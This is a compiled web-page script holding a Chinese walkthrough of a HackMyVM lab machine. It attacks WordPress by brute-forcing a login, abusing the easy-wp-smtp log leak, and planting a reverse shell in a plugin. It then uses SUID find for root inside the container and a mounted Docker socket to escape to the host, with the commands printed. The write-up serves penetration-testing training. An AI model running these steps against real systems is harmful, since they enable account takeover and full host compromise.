(window.webpackJsonp=window.webpackJsonp||[]).push([[159],{521:function(s,a,t){"use strict";t.r(a);var e=t(11),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"存活主机扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[s._v("#")]),s._v(" 存活主机扫描")]),s._v(" "),a("p",[s._v("使用 arp-scan 进行存活主机扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth2 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.122   08:00:27:7e:be:6d       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标主机 IP ：192.168.6.122")]),s._v(" "),a("h2",{attrs:{id:"端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#端口扫描"}},[s._v("#")]),s._v(" 端口扫描")]),s._v(" "),a("p",[s._v("使用 nmap 扫描 TCP 全端口")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.122    \n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("25")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  smtp\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("53")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  domain\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("h2",{attrs:{id:"_80-端口-web-服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口-web-服务探测"}},[s._v("#")]),s._v(" 80 端口 Web 服务探测")]),s._v(" "),a("p",[s._v("dirsearch 简单扫描下目录，可以确定是 WordPress 网站，并且开启了 XML-RPC 接口")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/1.png",alt:""}})]),s._v(" "),a("p",[s._v("可以利用 wpscan 爆破出一个普通用户 user，普通用户没有 getshell 权限。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ wpscan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" http://saga.local/\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Performing password attack on Wp Login against "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user/s\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("SUCCESS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" - userd4ve / changeme                                                                                                                              \nTrying userd4ve / changeme Time: 00:00:45 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3905")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14348297")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.02")]),s._v("%  ETA: ??:??:??\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Valid Combinations Found:\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Username: userd4ve, Password: changeme\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("使用 nuclei 扫描漏洞，扫描出一个 SMTP 插件 easy-wp-smtp 存在高危漏洞，并且发现 wordpress 管理员用户 wpadmin")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/2.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("WordPress easy-wp-smtp plugin 1.4.4之前版本存在安全漏洞，该漏洞源于允许接管管理员帐户，如果攻击者可以列出wp-content/plugins/easy-wp-smtp/目录，则他们可以 发现包含所有密码重置链接的日志文件（例如，＃＃＃＃＃＃＃＃＃＃＃＃＃ _ debug_log.txt）。 攻击者可以请求重设管理员密码，然后使用在那里找到的链接。")])]),s._v(" "),a("p",[s._v("可以在 wp-content/plugins/easy-wp-smtp/ 目录下找到 60cafc19ba1c5_debug_log.txt 日志文件，那么我们就可以通过 忘记密码 功能来重置管理员密码，在 SMTP 日志中找到重置密码的链接。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/3.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/4.png",alt:""}})]),s._v(" "),a("p",[s._v("日志里可以找到最新的重置密码链接")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/5.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/6.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"获取-webshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#获取-webshell"}},[s._v("#")]),s._v(" 获取 Webshell")]),s._v(" "),a("p",[s._v("使用管理员用户 wpadmin 登录 WordPress 后台，修改插件内容，例如 你好多莉 插件，添加一句反弹 shell 命令，保存并在安装的插件中启用你好多莉插件即可拿到 反弹shell")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/7.png",alt:""}})]),s._v(" "),a("p",[s._v("稳定shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("script /dev/null "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 按下 Ctrl+Z")]),s._v("\nstty raw -echo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fg")]),s._v("\nreset xterm\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("TERM")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xterm\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("SHELL")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("通过根目录存在 .dockerenv 文件，可以判断当前 shell 在 Docker 容器中运行。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/8.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"容器-提权到-root"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#容器-提权到-root"}},[s._v("#")]),s._v(" 容器 提权到 root")]),s._v(" "),a("p",[s._v("容器存在 suid 的 find 命令，可以拿到 root 权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@saga:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-perm")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-4000")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-type")]),s._v(" f "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n\n/usr/bin/find\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/9.png",alt:""}})]),s._v(" "),a("p",[s._v("提权到容器 root shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@saga:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-exec")]),s._v(" /bin/sh "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-quit")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("euid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h2",{attrs:{id:"docker-逃逸"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#docker-逃逸"}},[s._v("#")]),s._v(" docker 逃逸")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://hacktricks.xsx.tw/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation",target:"_blank",rel:"noopener noreferrer"}},[s._v("Docker Breakout / Privilege Escalation"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://wiki.teamssix.com/cloudnative/docker/docker-socket-escape.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("挂载 Docker Socket 逃逸"),a("OutboundLink")],1)])]),s._v(" "),a("p",[s._v("在容器内发现挂载了 宿主机的 docker.sock 文件，并且容器里存在 docker 客户端，可以通过 docker.sock 文件连接到宿主机的 docker 服务，从而实现逃逸。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# find / -name docker.sock 2>/dev/null")]),s._v("\n/run/docker.sock:/var/run/docker.sock\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# which docker")]),s._v("\n/usr/bin/docker\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("查看 docker 镜像，使用 -H 参数指定 docker.sock 文件路径")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# docker  -H unix:///run/docker.sock images")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("无法利用")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/10.png",alt:""}})]),s._v(" "),a("p",[s._v("在 /run 目录发现另一个 docker sock 文件，可以发现 docker.saga 才是真正的docker sock 文件，并且存在 ubuntu:18.04 镜像")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/11.png",alt:""}})]),s._v(" "),a("p",[s._v("直接 docker 逃逸，跑一个 docker 容器，并且挂载宿主机的根目录到容器内，这样可以直接操作宿主机文件系统")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-H")]),s._v(" unix:///run/docker.saga run "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-it")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--privileged")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-v")]),s._v(" /:/host ubuntu:18.04 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chroot")]),s._v(" /host /bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/hmv-realsaga/12.png",alt:""}})])])}),[],!1,null,null,null);a.default=n.exports}}]);